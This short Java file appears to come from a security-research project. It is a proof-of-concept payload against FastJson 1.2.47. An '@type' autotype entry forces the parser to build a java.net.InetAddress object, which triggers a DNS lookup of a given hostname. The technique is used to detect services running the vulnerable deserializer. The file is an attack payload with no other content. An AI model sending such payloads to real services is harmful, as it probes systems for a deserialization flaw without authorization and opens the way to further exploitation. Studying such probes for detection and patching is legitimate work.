package com.jemmy.serialize.leak;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import java.net.InetAddress;

/**
 * FastJson 1.2.47
 *
 * @author zhujiang.cheng
 * @since 2020/6/3
 */
public class NetAddressAttack {

    public static void main(String[] args) {
        String payload = "{\"rand1\":{\"@type\":\"java.net.InetAddress\",\"val\":\"dev-config-admin.xxx.com\"}}\n";
        JSONObject jsonObject = JSON.parseObject(payload);
        InetAddress address = jsonObject.getObject("rand1", InetAddress.class);
        System.out.println(address);
    }

}
